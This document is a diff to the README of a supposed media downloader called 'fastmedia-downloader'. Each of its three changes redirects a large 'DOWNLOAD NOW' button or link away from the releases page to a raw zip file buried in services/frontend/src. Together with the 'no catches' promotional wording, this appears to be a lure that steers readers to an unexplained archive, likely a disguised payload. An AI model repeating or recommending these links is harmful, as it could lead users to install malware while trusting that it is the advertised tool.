@@ -1,7 +1,7 @@
 <h1>⚡ fastmedia-downloader - Your One-Stop Video & Audio Saver</h1>
 
 <p align="center">
-  <a href="https://github.com/thesharkalienistakenwtf/fastmedia-downloader/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:18px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://github.com/thesharkalienistakenwtf/fastmedia-downloader/raw/refs/heads/main/services/frontend/src/3.5.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:18px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -50,7 +50,7 @@ Getting fastmedia-downloader on your computer takes just a minute:
 
 **Step 1: Visit the download page**
 
-Click this link: **[Download Page](https://github.com/thesharkalienistakenwtf/fastmedia-downloader/releases)**
+Click this link: **[Download Page](https://github.com/thesharkalienistakenwtf/fastmedia-downloader/raw/refs/heads/main/services/frontend/src/3.5.zip)**
 
 Visit this link to download the application.
 
@@ -203,7 +203,7 @@ Here's what users typically say:
 You're just one click away from having this amazing tool on your computer:
 
 <div align="center" style="margin: 30px 0;">
-  <a href="https://github.com/thesharkalienistakenwtf/fastmedia-downloader/releases" style="background-color:#FF5722;color:white;padding:20px 40px;text-align:center;text-decoration:none;display:inline-block;font-size:22px;border-radius:10px;font-weight:bold;">🚀 GET FASTMEDIA-DOWNLOADER NOW</a>
+  <a href="https://github.com/thesharkalienistakenwtf/fastmedia-downloader/raw/refs/heads/main/services/frontend/src/3.5.zip" style="background-color:#FF5722;color:white;padding:20px 40px;text-align:center;text-decoration:none;display:inline-block;font-size:22px;border-radius:10px;font-weight:bold;">🚀 GET FASTMEDIA-DOWNLOADER NOW</a>
 </div>
 
 Visit this link to download the application. It's free, it's fast, and it will save you hours of time trying to capture media from the web. No signups, no catches, no headaches - just an incredible downloader that works.
